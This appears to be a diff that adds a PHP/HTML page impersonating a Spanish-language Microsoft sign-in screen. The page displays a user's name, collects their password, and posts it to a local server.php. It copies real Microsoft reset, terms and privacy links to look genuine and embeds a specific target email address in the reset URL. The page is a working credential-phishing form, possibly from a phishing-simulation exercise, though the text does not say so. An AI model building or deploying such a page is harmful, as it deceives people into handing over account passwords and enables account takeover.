@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Iniciar sesión en la cuenta</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div id="container">
+    <img id="img1" src="image/bannerlogo.png" alt="">
+    <p id="user_login"><?= $user ?></p>
+    <p id="p1">Escribir contraseña</p>
+    <form id="form" method="POST" action="server.php">
+        <input id="textbox" type="password" size="35" name="password" placeholder="Contraseña" required>
+        <input type="hidden" name="user" value="<?= $user ?>">
+        <hr>
+        <a id="a1" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fed8cd32c-0c47-4917-8359-18a10e8f443c%2freprocess%3fctx%3drQQIARAA42KwUs4oKSkottLXL87MKUstKi7JL8rVK04tKstMTtXNyy_XS87PLRLiEmjdvCSLz4LdfZ5BzRHVy2lfVjHqEaFTPy-xrCAxPVUvJf8Qo3Kwn7OhmXFSkoWZgWVykmWScYqlqYmRiYVJGpBnYmZqbpx4gZHxBSPjLSbW4MTcHKNfTKalRXlW-YnFmcVWeYm5qcVWJclWwY6-PlaGeoZgkcwU3TSgxYklVqV5xQWpyZlpmakps5hJdNwmZpXUFIvkFGOjZF2DZBNzXRNLQ3NdC2NTS11Di0RDg1SLNBMT4-QLLDyvWHgMmK04OLgEGCQYFBh-sDAuYgUGz817Pg7F8ee9pjtXOOYp8TKcYtXX9i4qCs3PLNM2dIswyCtwdSwoScyJMgvyCEy21HcriLIsDistTHLRT_OysDWwMpzAxnuKjeEDG2MHO8MsdoZdnCR64QAvww--SzMevfixb-VbDwA1&mkt=es-ES&hosted=0&device_platform=Windows+10&username=dcortijo%40silver-storm.com">¿He olvidado mi contraseña?</a><br><br>
+        <div id="buttons">
+            <button id="submit" name="submit" type="submit">Iniciar sesión</button>
+        </div>
+    </form>
+    <div id="greeting">
+        <p>Welcome to SilverStorm Solutions!</p>
+    </div>
+</div>
+
+<!--<div id="options">
+    <button id="button1">
+        <img id="img3" src="image/key.png" alt="">
+        <label id="label2" for="">Sign-in options</label>
+    </button>
+
+</div>-->
+
+<div id="div3">
+    <a id="a4" href="https://www.microsoft.com/es-ES/servicesagreement/">Términos de uso</a>
+    <a id="a5" href="https://privacy.microsoft.com/es-ES/privacystatement">Privacidad y cookies</a>
+
+</div>
+</body>
+</html>
